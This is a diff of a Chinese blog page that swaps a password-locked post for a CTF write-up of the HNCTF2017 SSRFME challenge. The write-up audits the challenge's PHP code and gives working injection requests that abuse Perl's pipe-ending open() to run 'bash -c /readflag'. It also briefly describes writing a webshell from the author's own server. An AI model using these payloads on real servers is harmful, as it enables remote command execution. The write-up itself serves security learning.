@@ -7,19 +7,25 @@
   
   
   
-  <title>start | 云</title>
+  <title>HNCTF-SSRFME | 云</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="我的秘密都藏起来了，请输入密码查看">
+  <meta name="description" content="# HNCTF2017  SSRFME 今天深度剖析一下 SSRFme 这道题目  拿道题目从上往下的代码审计进行分析 第一部分： 12345if (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;        $http_x_headers &#x3D; explode(&amp;#x27;,&amp;#x27;, $_SERVER[&amp;#x27;HTTP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="start">
-<meta property="og:url" content="http://example.com/2023/08/01/angry/index.html">
+<meta property="og:title" content="HNCTF-SSRFME">
+<meta property="og:url" content="http://example.com/2024/02/01/HNCTF-SSRFME/index.html">
 <meta property="og:site_name" content="云">
-<meta property="og:description" content="我的秘密都藏起来了，请输入密码查看">
+<meta property="og:description" content="# HNCTF2017  SSRFME 今天深度剖析一下 SSRFme 这道题目  拿道题目从上往下的代码审计进行分析 第一部分： 12345if (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;        $http_x_headers &#x3D; explode(&amp;#x27;,&amp;#x27;, $_SERVER[&amp;#x27;HTTP">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-08-01T09:20:10.000Z">
-<meta property="article:modified_time" content="2023-12-11T03:54:18.954Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/0f54478b191340d98b6b0e9c25109bf0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/8e736f1671164031817ec698e104c05d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/14fbc2d0603d498ebf49b33e7381c7f0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/84e08f376f74413b8fec7dee88b3e736.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/direct/fba9dc5d9d6b466ab256ab5dc3d1fc02.png">
+<meta property="article:published_time" content="2024-01-31T16:31:16.000Z">
+<meta property="article:modified_time" content="2024-01-31T16:32:24.037Z">
 <meta property="article:author" content="NYG">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/direct/0f54478b191340d98b6b0e9c25109bf0.png">
   
     <link rel="alternative" href="/atom.xml" title="云" type="application/atom+xml">
   
@@ -264,11 +270,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-angry" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-HNCTF-SSRFME" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2023/08/01/angry/" class="article-date">
-      <time datetime="2023-08-01T09:20:10.000Z" itemprop="datePublished">2023-08-01</time>
+      <a  href="/2024/02/01/HNCTF-SSRFME/" class="article-date">
+      <time datetime="2024-01-31T16:31:16.000Z" itemprop="datePublished">2024-02-01</time>
 </a>
 
     </div>
@@ -282,7 +288,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      start
+      HNCTF-SSRFME
     </h1>
   
 
@@ -300,18 +306,77 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="7afbd029f01d3605855320e965644db53b6138d9aae52752336a04888ea10bf8">2b12bcb542b12d5c4e0a1b1f04d417ad031d4a8940d0b6a687aeb3115c48f693405ed99ca2130249114bac8b693165ecbcab5551429e7595f32397c248579dc928be2987f87cef09c384276e7567e0f8cb320097c6f17f1c14f72cf9765bea81d143ebc6fa2e986a056c401b9b257731d20a099d52d7eba8cd5068b32c045ad30abc79e865c45b6271854b6d4f05911c4e8434a1d5d3f8a7215fe915c0cd3dd34cf9f5c363298be917c2494cf62adb783f156e0f48b18efef03831e055f660ca04eaea06d1c113af65c703fc170e32486efd45caa34da8ded88453fb4de2565cb7b7acdae26731ef579a423f0a79faf7eb7bb1a65260c6e0f28f8b50179424166bc4d0a017fff4e5a7100584dcf2d907913db54c075ac317efad9f5abff2ccceeae575a4010e17799c3009481b184d039c5e902d46b9cc9f02e680e49da3ff41a3179c95b7d5d281af7fca9d24d452e65a7bd395c4f8dc73acacd6cfffae7acf8225020f46e819213c6e171dfe866f0d9bd03d176f253d12b39d07852202cb8984ef17067c81d8732e2981d68d7e793a2d9bd5df63c41d1b61266b18b8f23436454ab08f473d938e6330f550fd78e0e9c3c57ed66cc302768b8372e8ff65d34302ad36971ee242d4ed7b22f4814d24c4ed8c99a2e1cc29ae0d06737c53dc9a5fb5ca35a7022552733d59acb34d4e1dbfed5565166685fa4e138a504c69cd304ee07ecd9fae30659b37a36269af66be51f71da89cf25bcee047500809c85e2d4c22c42f2162b96f77dd0210f58fdb34e1a2a467b47af69c73a4e296e7a5fd25be538438cc2ff04e0a4fd306456ba9d6ac7ba29a46a82f7efbce869d62f85049988d40e716bc239d6e39340d96b271e917e968aa5997e4f041272e9a82836fd14b4b5144fd7b04f7af2c8d643b9df3110018dd5680e2b3067fac6bc490c128e8da7e25936f41a6e3af8bebba7d1d18a1dcc8e46c62bed013d492a2f92197fb70052266fad7c55d645a50b157333874f1c79d7405f321da7d929a8aa2d4cd867e7b10c93f008bfb5fb6867e6f8b966fe2ef795ec18025aa39232f3a6ca1dd04e9bf862e82fb9c4b24340171a42a4fa76afaa0a763840612c2059535ebede9baaf9f20582185269b6f0ee366fe2e44399b9acf86e9a186691db0007717136499351436213dc7f5bc753ad777783e892c005c34ca8f10d1199d825501bc9e75807399b8818b41de914ba3b985f781769c3bba6745372b48dd3a4b6d00b92240d51421e94d7f8bcc1739222657c130b858059cfd4ea5c735c9fefca8d173b8ca34826d4e3b21bd6832ce83f40285e5bc1e03926bc45f91d584bc7b531cf803a8638638fd540e7ae06041896c76e565a07e8aabe064a446c8091e216ef4225b65cca5c849b963f86190b9b4adf5a08916edac5b2ec1eebff5abd37c9a1e885879bbe974500dc915bd1d7dc7e58a03de16bfa07aeac8f423ffa13c6ddc9e55826d35f7433658ecea67aa6fe3c3e7c2e030bca6f0411c5d99355f3e13385f99a56a57a632f74e85b4a6ae28db6257a9098e756e66845357e3942d549569d1a24ca65a89dacbebe43cca7ff1f8e3400b35ecc2137b35a857914c269353110ffe515af7a65c6fbcae89945fb4c9f1ce57a4299460210dd2b80c0b49d29128cbec52cf576adfe425826431a1d501a4b550207cfbef3f013273f1ced4b25a3e56b8df127a876aeb6145ce44a54b63d8f0d9159f2fbe6d8bd0939b02f44dfb3d8d480a53033f034bddf1f15930fd48fdb4775303efa16292de4136fa506e97c09c2774c0bc1661016ee8ad3170c000573abd73d9cc779dc89388b7f02077441044087f9f1ab2e4e8f55231a1632758404ef56570336bfbc55d456c30f27f034948fda737ec08b922eb733220c64d92f449b0c96a4d1a806f92433afd22d66cc4fe11968e7fb684cc3f546a7ac4632b6d9eb33d511539b4f1a1594869fd31a9b37cb63d559860020f729b785c7e16daf4eeb2a089f9c5547690e44ec9e7ebb97a4c4be559890f262362bd7293e31fdbc8161a8716ca87284264ff9708fb0f5f308e1eb08593af76a8e478a6d719476734dc7a41623c16d9c6d69c6e4343b769503cc49e5f5aa2d27c5502fd810c1173039a10243f0dff3c969debbf56dc0b9fca9dd5d56c8b11ad7101a4f8b9ebd93ee1eb541081389c72a6a20c38ec1cb119ed5ccd8cc58af2cd</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我喜欢的人的名字</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+        <h2 id="hnctf2017-ssrfme"><a class="markdownIt-Anchor" href="#hnctf2017-ssrfme">#</a> HNCTF2017  SSRFME</h2>
+<p>今天深度剖析一下 SSRFme 这道题目<br>
+<img src="https://img-blog.csdnimg.cn/direct/0f54478b191340d98b6b0e9c25109bf0.png" alt="在这里插入图片描述"></p>
+<p><strong>拿道题目从上往下的代码审计进行分析</strong></p>
+<p>第一部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br></pre></td></tr></table></figure>
+<p>功能：<br>
+1.$_SERVER 的功能是接受一个参数，这里是在 X-FORWARD 里面</p>
+<blockquote>
+<p>在首行代码中，explode (’,’, $_SERVER [‘HTTP_X_FORWARDED_FOR’]) 使用逗号 (,) 作为分隔符将字符串分割成数组。因为这个头部允许包含多个 IP 地址，其中最左边的 IP 地址是最初的客户端 IP。</p>
+</blockquote>
+<p>第二部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sandbox</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br></pre></td></tr></table></figure>
+<p>功能：<br>
+1.sandbox 变量是由 sandbox 加上（orange + 上文的地址赋值）</p>
+<blockquote>
+<p>举例说明： 赋值 127.0.0.1 加密后为 cfbb870b58817bf7705c0bd826e8dba7。<br>
+组合后就是<br>
+ sandbox/cfbb870b58817bf7705c0bd826e8dba7</p>
+</blockquote>
+<p>2.mkdir 创建文件夹<br>
+ 3.chdir 更改当前目录到文件夹</p>
+<p>第三部分：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">   <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">   <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br></pre></td></tr></table></figure>
+<p>功能:<br>
+1. <code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code> <br>
+ 这里有一个重点 perl 脚本 GET 的使用，可以直接查询目录，和正常指令一样<br>
+<img src="https://img-blog.csdnimg.cn/direct/8e736f1671164031817ec698e104c05d.png" alt="在这里插入图片描述"><br>
+ 2.Pathinfo () 函数作用</p>
+<blockquote>
+<pre><code>可以通过以下方式访问 `pathinfo()` 返回的关联数组中的不同信息：
+</code></pre>
+<ul>
+<li><code>$info['dirname']</code> ：返回文件所在目录的路径。</li>
+<li><code>$info['basename']</code> ：返回文件的完整基本名称（包含文件名和扩展名）。</li>
+<li><code>$info['extension']</code> ：返回文件的扩展名。</li>
+<li><code>$info['filename']</code> ：返回文件的名称（不包含扩展名）。   ```</li>
+</ul>
+</blockquote>
+<p>3.str_replace 的把点换成空格</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>在当前目录就是 sandbox/cfbb870b58817bf7705c0bd826e8dba7 文件夹建立文件名不要拓展名<br>
+回到本题，</p>
+<h2 id="方法一perl命令读取"><a class="markdownIt-Anchor" href="#方法一perl命令读取">#</a> 方法一：perl 命令读取</h2>
+<p>我们可以尝试 GET / 读取根目录</p>
+<p><code>?url= /&amp;filename=666.txt</code> <br>
+ 访问一下：<br>
+/sandbox/fcf2bccafc269c160382150a0166d632/666.txt<br>
+ 在当前目录就建立了以 data 数据内容的一个个目录<br>
+再看到<br>
+<img src="https://img-blog.csdnimg.cn/direct/14fbc2d0603d498ebf49b33e7381c7f0.png" alt="在这里插入图片描述"><br>
+可以看到根目录，那怎么读取，先尝试<br>
+ <code>url=/flag&amp;filename=6667.txt</code>  读取是空白，再看 readflag，是乱码二进制数据很明显就是要我们运行，那这里就要用到 file 配合。</p>
+<blockquote>
+<p>主要的知识点：perl 函数看到要打开的文件名中如果以管道符（键盘上那个竖杠 |）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到 perl 程序运行的结果。</p>
+</blockquote>
+<p>针对 GET 命令，使用 file: 来搭配读取文件</p>
+<blockquote>
+<p>而想执行 readflag 文件，仅仅是使用 file: 是不够的，还需要使用 Linux 下的命令执行：bash -c 首先得满足前面的文件存在，<br>
+ 才会继续到 open 语句，所以在执行命令前得保证有相应的同名文件:</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash <span class="literal">-c</span> /readflag|</span><br></pre></td></tr></table></figure>
+<p>先新建一个名为 “bash -c /readflag|” 的文件，用于之后的命令执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash <span class="literal">-c</span> /readflag|&amp;filename=aaa</span><br></pre></td></tr></table></figure>
+<p>这就拿到 fkag 了<br>
+<img src="https://img-blog.csdnimg.cn/direct/84e08f376f74413b8fec7dee88b3e736.png" alt="在这里插入图片描述"></p>
+<h2 id="方法二vps写入"><a class="markdownIt-Anchor" href="#方法二vps写入">#</a> 方法二：vps 写入</h2>
+<p>get 访问自己服务器上的文件写入木马即可之后用一句话木马，但执行要用<br>
+ <code>cmd=system('bash -c /readflag');</code> <br>
+<img src="https://img-blog.csdnimg.cn/direct/fba9dc5d9d6b466ab256ab5dc3d1fc02.png" alt="在这里插入图片描述"></p>
+
       
     </div>
     
@@ -319,13 +384,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2023/08/01/angry/">start</a></p>
+        <p><span>本文标题:</span><a  href="/2024/02/01/HNCTF-SSRFME/">HNCTF-SSRFME</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
-        <p><span>发布时间:</span>2023年08月01日 - 17时20分</p>
-        <p><span>最后更新:</span>2023年12月11日 - 11时54分</p>
+        <p><span>发布时间:</span>2024年02月01日 - 00时31分</p>
+        <p><span>最后更新:</span>2024年02月01日 - 00时32分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2023/08/01/angry/" title="start">http://example.com/2023/08/01/angry/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2023/08/01/angry/　　作者: " title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2024/02/01/HNCTF-SSRFME/" title="HNCTF-SSRFME">http://example.com/2024/02/01/HNCTF-SSRFME/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2024/02/01/HNCTF-SSRFME/　　作者: " title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -336,18 +401,9 @@
 
 <nav id="article-nav">
   
-    <a  href="/2023/08/02/August-1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          August.1
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2023/07/17/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a  href="/2024/01/23/Day%20by%20Day/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">New</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -359,7 +415,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#hnctf2017-ssrfme"><span class="toc-number">1.</span> <span class="toc-text"> HNCTF2017  SSRFME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80perl%E5%91%BD%E4%BB%A4%E8%AF%BB%E5%8F%96"><span class="toc-number">2.</span> <span class="toc-text"> 方法一：perl 命令读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8Cvps%E5%86%99%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text"> 方法二：vps 写入</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -432,13 +488,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2023/08/02/August-1/" title="上一篇: August.1">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2023/07/17/hello-world/" title="下一篇: Hello World">
+            <a  href="/2024/01/23/Day%20by%20Day/" title="下一篇: New">
                 <i class="fa fa-angle-right"></i>
             </a>
         
